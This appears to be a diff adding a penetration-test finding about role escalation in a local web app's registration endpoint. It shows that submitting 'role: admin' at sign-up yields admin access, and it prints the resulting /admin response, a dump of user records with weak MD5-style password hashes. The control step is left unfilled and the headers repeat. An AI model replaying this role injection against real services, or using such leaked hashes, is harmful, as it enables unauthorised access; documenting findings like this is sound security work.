@@ -1,0 +1,61 @@
+Finding: F-03 — Registration role escalation
+Date: 2026-11-02T00:02:13.5655401+07:00
+Git commit: 93a2e9bf8cd3306d64edc25351c97fbb604b7303
+
+Control:
+A normal registration without a role was tested with a disposable account.
+Expected admin response: 403
+Record the observed status here.
+
+Exploit:
+Registration endpoint: POST http://localhost:8080/register
+Disposable username: role-escalation-20261101
+Password: not recorded
+Submitted role: admin
+
+After login:
+Target: GET http://localhost:8080/admin
+Observed response:
+HTTP/1.0 200 OK
+Content-Type: application/json
+Content-Length: 534
+Server: Werkzeug/2.0.1 Python/3.12.16
+Date: Sun, 01 Nov 2026 17:01:51 GMT
+
+
+Response body:
+HTTP/1.0 200 OK
+Content-Type: application/json
+Content-Length: 534
+Server: Werkzeug/2.0.1 Python/3.12.16
+Date: Sun, 01 Nov 2026 17:01:51 GMT
+
+[
+  {
+    "id": 1, 
+    "password": "15da1f78ad7d474862865bab1aab4d51", 
+    "role": "user", 
+    "username": "alice"
+  }, 
+  {
+    "id": 2, 
+    "password": "0192023a7bbd73250516f069df18b500", 
+    "role": "admin", 
+    "username": "admin"
+  }, 
+  {
+    "id": 3, 
+    "password": "bf193c5d83f528d4b9a021aeb11db278", 
+    "role": "user", 
+    "username": "normal-registration-20261101"
+  }, 
+  {
+    "id": 4, 
+    "password": "bf193c5d83f528d4b9a021aeb11db278", 
+    "role": "admin", 
+    "username": "role-escalation-20261101"
+  }
+]
+
+
+Result: CONFIRMED if the role-submitting account received HTTP 200 and administrator access.
